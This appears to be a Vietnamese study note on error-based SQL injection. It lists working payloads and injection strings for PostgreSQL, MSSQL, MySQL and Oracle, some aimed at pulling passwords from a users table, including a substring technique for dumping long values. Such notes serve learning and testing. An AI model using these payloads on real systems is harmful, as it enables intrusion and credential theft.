

**Metadata:**
* **Parent Link:** [[SQL_Injection-Master_Guide]]

---

## 1. The Core Concept (Nguyên lý Cốt lõi)
**Error-based SQLi** hoạt động dựa trên việc cố tình tạo ra một lỗi ngữ nghĩa (Semantic Error) hoặc lỗi ép kiểu (Type Conversion Error) trong lúc **DBMS** đang đánh giá một biểu thức. 
Kẻ tấn công sẽ lồng ghép một **Subquery** (Truy vấn con chứa dữ liệu cần lấy) vào bên trong biểu thức gây lỗi đó. Khi **DBMS** ném ra thông báo lỗi, nó sẽ "vô tình" in kèm luôn cả kết quả của Subquery ra màn hình.

---

## 2. PostgreSQL Vectors (Ép kiểu dữ liệu - Type Casting)
Kỹ thuật phổ biến nhất trên PostgreSQL là ép một chuỗi văn bản (String) thành một số nguyên (Integer). Khi quá trình ép kiểu thất bại, PostgreSQL sẽ in ra toàn bộ chuỗi văn bản đó trong thông báo lỗi.

* **Vector 1: Sử dụng hàm `CAST()`**
  * **Payload:** `CAST((SELECT password FROM users LIMIT 1) AS int)`
  * **Mô phỏng tiêm nhiễm:** `' AND 1=CAST((SELECT version()) AS int)--`
  * **Thông báo lỗi nhận được:** `invalid input syntax for type integer: "PostgreSQL 14.5 on x86_64-pc-linux-gnu..."`

* **Vector 2: Sử dụng toán tử `::` (Đặc thù PostgreSQL)**
  * **Payload:** `(SELECT password FROM users LIMIT 1)::int`

---

## 3. Microsoft SQL Server (MSSQL) Vectors
Tương tự như PostgreSQL, MSSQL rất nhạy cảm với các lỗi chuyển đổi kiểu dữ liệu (Conversion Errors).

* **Vector 1: Sử dụng hàm `CONVERT()`**
  * **Payload:** `CONVERT(int, (SELECT @@version))`
  * **Mô phỏng tiêm nhiễm:** `' AND 1=CONVERT(int, (SELECT @@version))--`
  * **Thông báo lỗi nhận được:** `Conversion failed when converting the varchar value 'Microsoft SQL Server 2019...' to data type int.`

* **Vector 2: Sử dụng hàm `CAST()`**
  * **Payload:** `CAST((SELECT @@version) AS int)`

---

## 4. MySQL Vectors (Phân tích cú pháp XML)
MySQL (từ phiên bản 5.1.5) thường được khai thác qua các hàm xử lý XML do chúng trả về thông báo lỗi rất chi tiết khi nhận được đường dẫn **XPath** không hợp lệ. Ta dùng dấu ngã `~` (`0x7e`) để cố tình làm hỏng đường dẫn này.

* **Vector 1: Sử dụng hàm `EXTRACTVALUE()`**
  * **Payload:** `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))`
  * **Mô phỏng tiêm nhiễm:** `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--`
  * **Thông báo lỗi nhận được:** `XPATH syntax error: '~10.4.21-MariaDB~'`

* **Vector 2: Sử dụng hàm `UPDATEXML()`**
  * **Payload:** `UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)`

*(Lưu ý: Thông báo lỗi XPath của MySQL bị giới hạn ở mức **32 ký tự**. Phải dùng hàm `SUBSTRING()` để cắt và lấy phần dữ liệu bị thiếu ở các truy vấn sau).*

---

## 5. Oracle Vectors
Oracle có cơ chế quản lý lỗi rất nghiêm ngặt, nhưng vẫn tồn tại những hàm hệ thống (System Functions) hoặc cơ chế ép kiểu có thể bị lợi dụng.

* **Vector 1: Hàm `EXTRACTVALUE` (Oracle cũng hỗ trợ hàm này)**
  * **Payload:** `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><t></t>'), CONCAT('~', (SELECT banner FROM v$version)))`
  * **Mô phỏng tiêm nhiễm:** `' AND 1=EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><t></t>'), CONCAT('~', (SELECT banner FROM v$version)))--`
  * **Thông báo lỗi nhận được:** `ORA-31011: XML parsing failed ... XPATH syntax error: ~Oracle Database 11g...`

* **Vector 2: Sử dụng gói `UTL_INADDR` (Phân giải tên miền)**
  * **Cơ chế:** Ép Oracle phân giải một tên miền (Hostname) không tồn tại, chứa dữ liệu nhạy cảm.
  * **Payload:** `UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version))`
  * **Thông báo lỗi nhận được:** `ORA-29225: host unknown: Oracle Database 11g...`

* **Vector 3: Ép kiểu với `TO_NUMBER()`**
  * **Payload:** `TO_NUMBER((SELECT banner FROM v$version))`
  * **Thông báo lỗi nhận được:** `ORA-01722: invalid number` *(Lưu ý: Lỗi này đôi khi không in ra dữ liệu chuỗi, nên Vector 1 và 2 thường được ưu tiên hơn).*

---

## 6. Advanced Workarounds (Kỹ thuật Nâng cao)
Khi gặp trường hợp dữ liệu trích xuất dài hơn giới hạn ký tự của thông báo lỗi (đặc biệt trên MySQL), ta bắt buộc phải sử dụng hàm cắt chuỗi để trích xuất cuốn chiếu (Dump data byte-by-byte).

* **Cú pháp cắt chuỗi tiêu chuẩn (`SUBSTRING`):**
  * `SUBSTRING(string, start_position, length)`
* **Ví dụ ứng dụng trên MySQL (Lấy mật khẩu dài 64 ký tự):**
  * *Request 1 (Lấy 32 ký tự đầu):* `EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 1, 32)))`
  * *Request 2 (Lấy 32 ký tự sau):* `EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 33, 32)))`